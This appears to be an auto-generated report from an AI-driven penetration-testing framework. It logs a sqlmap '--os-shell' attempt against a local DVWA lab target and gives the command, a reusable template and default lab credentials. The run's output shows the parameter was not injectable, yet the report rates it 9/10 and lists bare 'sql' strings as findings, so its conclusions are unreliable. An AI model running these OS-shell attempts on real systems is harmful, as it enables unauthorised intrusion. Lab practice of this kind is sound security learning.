# sqlmap-os-shell

## Tool Name & Category
| Field | Value |
|-------|-------|
| **Category** | exploit — Exploit Frameworks |
| **Binary** | `sqlmap` ✅ installed |
| **Agent** | exploit |
| **DVWA-optimized** | True |
| **Lab target** | `http://aegis-target` |

## Official Purpose
SQLmap OS shell attempt

## Exact Command(s) Executed
```bash
# SAFETY CHECK PASSED — local Docker lab only (DVWA + Juice Shop)
sqlmap -u 'http://aegis-target/vulnerabilities/sqli/?id=1' --os-shell --batch
```

| Metric | Value |
|--------|-------|
| Duration | 1.3s |
| Exit code | 0 |
| Effectiveness | **9/10** — Rich actionable output |

## Key Findings
- **Potential vulnerability signal:** sql
- **Potential vulnerability signal:** sql
- **Potential vulnerability signal:** sql
- **Potential vulnerability signal:** sql
- **Potential vulnerability signal:** sql
- **Potential vulnerability signal:** SQL
- **Potential vulnerability signal:** injection
- **Potential vulnerability signal:** SQL

## Full Output Summary
```
        ___
       __H__
 ___ ___[)]_____ ___ ___  {1.10.6#stable}
|_ -| . [(]     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 05:48:50 /2026-06-24/

[1/1] URL:
GET http://aegis-target/vulnerabilities/sqli/?id=1
do you want to test this URL? [Y/n/q]
> Y
[05:48:50] [INFO] testing URL 'http://aegis-target/vulnerabilities/sqli/?id=1'
[05:48:50] [INFO] using '/root/.local/share/sqlmap/output/results-06242026_0548am.csv' as the CSV results file in multiple targets mode
[05:48:50] [INFO] testing connection to the target URL
got a 302 redirect to 'http://aegis-target/login.php'. Do you want to follow? [Y/n] Y
you have not declared cookie(s), while server wants to set its own ('PHPSESSID=4rp3sofvg09...8iacqvjaj3;security=low;security=low'). Do you want to use those [Y/n] Y
[05:48:50] [INFO] testing if the target URL content is stable
[05:48:50] [WARNING] GET parameter 'id' does not appear to be dynamic
[05:48:50] [WARNING] heuristic (basic) test shows that GET parameter 'id' might not be injectable
[05:48:50] [INFO] testing for SQL injection on GET parameter 'id'
[05:48:50] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[05:48:51] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[05:48:51] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[05:48:51] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[05:48:51] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
[05:48:51] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
[05:48:51] [INFO] testing 'Generic inline queries'
[05:48:51] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[05:48:51] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
[05:48:51] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
[05:48:51] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[05:48:51] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
[05:48:51] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
[05:48:51] [INFO] testing 'Oracle AND time-based blind'
it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] Y
[05:48:51] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[05:48:51] [WARNING] GET parameter 'id' does not seem to be injectable
[05:48:51] [ERROR] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment') and/or switch '--random-agent', skipping to the next target
[05:48:51] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/root/.local/share/sqlmap/output/results-06242026_0548am.csv'

[*] ending @ 05:48:51 /2026-06-24/


```

## What I Learned / Edge Cases / Gotchas
- DVWA requires authenticated session — `/workspace/dvwa_login.sh` sets cookies + security=low
- Registry template: `sqlmap -u '{web}/vulnerabilities/sqli/?id=1' --os-shell --batch {extra}`

## Recommended Safe Parameters for Learning Labs
- Scope: `localhost:8080` (DVWA) or `localhost:3000` (Juice Shop) only
- From Kali network: `aegis-target`, `aegis-juice`
- DVWA login: `admin` / `password` — use `/workspace/dvwa_login.sh` for cookie-aware tools
- Suggested timeout: 300s

## Next Steps for Exploration & Development
Run `sqlmap --help` and tune `sqlmap -u '{web}/vulnerabilities/sqli/?id=1' --os-shell --batch {extra}` for your target.

---
*GrokStrike v2 — 2026-06-24T05:48:51.471063+00:00*
